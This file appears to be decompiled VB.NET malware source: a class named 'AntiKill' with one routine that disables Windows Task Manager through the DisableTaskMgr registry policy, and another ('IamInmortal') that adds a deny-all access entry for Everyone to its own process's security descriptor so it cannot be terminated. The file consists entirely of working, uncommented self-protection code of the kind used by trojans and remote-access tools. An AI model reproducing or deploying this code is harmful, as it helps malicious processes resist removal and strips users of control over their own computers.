Imports System
Imports System.ComponentModel
Imports System.Runtime.InteropServices
Imports System.Security.AccessControl
Imports System.Security.Principal
Imports Microsoft.Win32

Namespace Complex
	' Token: 0x0200000B RID: 11
	Friend Class AntiKill
		' Token: 0x06000042 RID: 66
		Private Declare Function GetKernelObjectSecurity Lib "advapi32.dll" (Handle As IntPtr, securityInformation As Integer, <Out()> pSecurityDescriptor As Byte(), nLength As UInteger, <System.Runtime.InteropServices.OutAttribute()> ByRef lpnLengthNeeded As UInteger) As Boolean

		' Token: 0x06000043 RID: 67
		Private Declare Function SetKernelObjectSecurity Lib "advapi32.dll" (Handle As IntPtr, securityInformation As Integer, <[In]()> pSecurityDescriptor As Byte()) As Boolean

		' Token: 0x06000044 RID: 68
		Private Declare Function GetCurrentProcess Lib "kernel32.dll" () As IntPtr

		' Token: 0x06000045 RID: 69 RVA: 0x00008324 File Offset: 0x00006524
		Public Sub DisTaskManager(enable As Boolean)
			Try
				Dim registryKey As RegistryKey = Registry.CurrentUser.CreateSubKey("Software\Microsoft\Windows\CurrentVersion\Policies\System")
				If enable AndAlso registryKey.GetValue("DisableTaskMgr") IsNot Nothing Then
					registryKey.DeleteValue("DisableTaskMgr")
				Else
					registryKey.SetValue("DisableTaskMgr", "1")
				End If
				registryKey.Close()
			Catch
			End Try
		End Sub

		' Token: 0x06000046 RID: 70 RVA: 0x0000839C File Offset: 0x0000659C
		Private Function GetProcessSecurityDescriptor(processHandle As IntPtr) As RawSecurityDescriptor
			Dim array As Byte() = New Byte(-1) {}
			Dim num As UInteger
			AntiKill.GetKernelObjectSecurity(processHandle, 4, array, 0UI, num)
			If num < 0UI OrElse CULng(num) > 32767UL Then
				Throw New Win32Exception()
			End If
			Dim securityInformation As Integer = 4
			Dim array2 As Byte() = New Byte(num - 1) {}
			array = array2
			If Not AntiKill.GetKernelObjectSecurity(processHandle, securityInformation, array2, num, num) Then
				Throw New Win32Exception()
			End If
			Return New RawSecurityDescriptor(array, 0)
		End Function

		' Token: 0x06000047 RID: 71 RVA: 0x00008404 File Offset: 0x00006604
		Private Sub SetProcessSecurityDescriptor(processHandle As IntPtr, dacl As RawSecurityDescriptor)
			Dim array As Byte() = New Byte(dacl.BinaryLength - 1) {}
			dacl.GetBinaryForm(array, 0)
			If Not AntiKill.SetKernelObjectSecurity(processHandle, 4, array) Then
				Throw New Win32Exception()
			End If
		End Sub

		' Token: 0x06000048 RID: 72 RVA: 0x0000843C File Offset: 0x0000663C
		Public Sub IamInmortal()
			Dim currentProcess As IntPtr = AntiKill.GetCurrentProcess()
			Dim processSecurityDescriptor As RawSecurityDescriptor = Me.GetProcessSecurityDescriptor(currentProcess)
			processSecurityDescriptor.DiscretionaryAcl.InsertAce(0, New CommonAce(AceFlags.None, AceQualifier.AccessDenied, 2035711, New SecurityIdentifier(WellKnownSidType.WorldSid, Nothing), False, Nothing))
			Me.SetProcessSecurityDescriptor(currentProcess, processSecurityDescriptor)
		End Sub
	End Class
End Namespace
